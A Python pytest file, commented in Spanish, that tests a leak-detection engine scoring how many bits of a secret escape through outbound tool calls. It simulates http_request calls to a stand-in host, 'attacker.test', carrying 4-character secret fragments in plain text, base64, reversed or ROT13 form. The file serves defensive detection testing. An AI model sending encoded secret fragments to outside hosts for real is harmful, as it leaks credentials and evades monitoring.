"""Fragmentos cortos codificados cuentan igual que en claro (#126).

Principio: si MIN_CANDIDATE (4) caracteres consecutivos del secreto cuentan como candidatos en claro,
también cuentan en las codificaciones que el motor ya decodifica. Con k = 8, un fragmento de 4 caracteres
nunca llega a confirmado, ni en claro ni codificado: «cuenta» quiere decir que suma bits (candidatos)
para la regla de rotación.
"""

from __future__ import annotations

import base64
import codecs
import random
import string

import pytest

from engine.bits import BitsEngine
from engine.bits.decoders import decode_base64
from engine.bits.engine import MIN_CANDIDATE

SECRET = "73a71492ba32ec39bde7f7a93248b56fa2439a16"   # 40 hex, 160 bits
ATTACKER = "http://attacker.test/c?d="

ENCODE = {
    "none": lambda f: f,
    "base64": lambda f: base64.b64encode(f.encode()).decode(),
    "reversed": lambda f: f[::-1],
    "rot13": lambda f: codecs.encode(f, "rot13"),
}


def send(engine: BitsEngine, payload: str, t: int = 1) -> dict:
    return engine.observe({"id": f"c{t}", "t": t, "tool": "http_request", "is_sink": True,
                           "args": {"url": ATTACKER + payload}, "session_id": "s"})["S"]


def one_fragment_bits(frag: str, enc: str) -> float:
    r = send(BitsEngine({"S": SECRET}), ENCODE[enc](frag))
    return r["bits"] + r["candidate_bits"]


# --------------------------------------------------------------------------- #
# base64
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("j", range(10))
def test_fragmento_de_4_en_base64_suma_16_bits_igual_que_en_claro(j):
    frag = SECRET[4 * j:4 * j + 4]
    assert one_fragment_bits(frag, "none") == 16.0
    assert one_fragment_bits(frag, "base64") == 16.0


def test_fragmento_de_5_en_base64_un_solo_relleno():
    frag = SECRET[:5]
    assert base64.b64encode(frag.encode()).decode().endswith("=") and \
        not base64.b64encode(frag.encode()).decode().endswith("==")
    assert one_fragment_bits(frag, "base64") == one_fragment_bits(frag, "none") == 20.0


def test_diez_fragmentos_en_base64_cuentan_las_40_posiciones_igual_que_en_claro():
    states = {}
    for enc in ("none", "base64"):
        e = BitsEngine({"S": SECRET}, W=50)
        for j in range(10):
            r = send(e, ENCODE[enc](SECRET[4 * j:4 * j + 4]), t=j + 1)
        states[enc] = r
    assert states["base64"] == states["none"]
    r = states["base64"]
    assert sorted(set(r["positions"]) | set(r["candidate_positions"])) == list(range(40))
    assert r["bits"] + r["candidate_bits"] == 160.0
    # Con k = 8 ninguna posición llega a confirmada con fragmentos de 4, ni en claro ni en base64.
    assert r["positions"] == []


def test_base64_corto_sin_relleno_no_se_decodifica():
    tok = base64.b64encode(SECRET[:4].encode()).decode().rstrip("=")   # 6 caracteres, sin "=="
    assert len(tok) == 6 and decode_base64(f"d={tok}") == []
    # Palabras de 6 o 7 letras sueltas (sin relleno) tampoco.
    assert decode_base64("status update branch") == []


def test_base64_corto_con_relleno_que_no_cuadra_no_se_decodifica():
    # 6 de cuerpo + un "=" da 7: no es múltiplo de 4.
    assert decode_base64("d=YjJkZQ=") == []
    assert set(decode_base64("d=YjJkZQ==")) == {"b2de"}   # estándar y url-safe dan lo mismo


def test_200_cadenas_base64_al_azar_de_8_caracteres_no_confirman_nada():
    rng = random.Random(126)
    alphabet = string.ascii_letters + string.digits + "+/"
    e = BitsEngine({"S": SECRET})
    total_candidates = 0
    for t in range(1, 201):
        tok = "".join(rng.choice(alphabet) for _ in range(8))
        r = send(e, tok, t=t)
        assert r["positions"] == [], tok
        total_candidates = max(total_candidates, len(r["candidate_positions"]))
    # Tampoco se acumulan candidatos al azar de forma relevante.
    assert total_candidates * 4 < 0.1 * 160


def test_minimo_coherente_con_el_motor():
    # 6 caracteres de base64 decodifican exactamente MIN_CANDIDATE bytes.
    assert len(base64.b64decode("YjJkZQ==")) == MIN_CANDIDATE


# --------------------------------------------------------------------------- #
# invertido y ROT13 (punto 2): ya contaban; se documenta con tests
# --------------------------------------------------------------------------- #
@pytest.mark.parametrize("j", range(10))
@pytest.mark.parametrize("enc", ["reversed", "rot13"])
def test_fragmento_de_4_invertido_o_rot13_suma_16_bits(enc, j):
    frag = SECRET[4 * j:4 * j + 4]
    assert one_fragment_bits(frag, enc) == 16.0


def test_rot13_en_hex_solo_cambia_las_letras():
    # En un secreto hexadecimal ROT13 cambia solo a–f (a→n … f→s); los dígitos quedan iguales.
    digits = "1492"                     # SECRET[4:8], solo dígitos: ROT13 lo deja igual
    assert SECRET[4:8] == digits and codecs.encode(digits, "rot13") == digits
    assert one_fragment_bits(digits, "rot13") == 16.0
    mixed = SECRET[0:4]                 # "73a7": cambia solo la "a"
    assert codecs.encode(mixed, "rot13") == "73n7"
    assert one_fragment_bits(mixed, "rot13") == 16.0
